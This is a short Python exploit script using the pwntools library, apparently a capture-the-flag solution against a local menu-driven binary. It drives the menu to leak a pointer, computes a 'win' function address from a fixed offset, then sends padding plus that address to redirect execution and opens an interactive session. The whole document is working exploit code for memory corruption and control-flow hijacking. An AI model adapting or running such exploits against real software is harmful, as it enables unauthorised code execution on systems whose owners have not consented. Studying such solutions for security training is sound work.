from pwn import *

p = process('./a.out')

p.recvuntil("Choice: ")
p.sendline("1")

p.recvuntil("Choice: ")
p.sendline(b"6")

p.recvuntil("Choice: ")
p.sendline(b"2")
p.recvuntil("What is your name: ")
p.send(b"A"*8)
p.recvuntil("Choice: ")
p.sendline(b"5")

p.recvuntil("AAAAAAAA")
leak = u64(p.recvn(6).ljust(8, b"\x00"))
print("leak : "+hex(leak))

win_addr = leak - 0x2b 
print("win address : "+hex(win_addr))

p.recvuntil("Choice: ")
p.sendline(b"4")
p.recvuntil("What is your name: ")

payload = b"junkjunk" #junk for padding
payload+= p64(win_addr)
p.send(payload)

p.recvuntil("Choice: ")
p.sendline(b"3")

p.interactive()
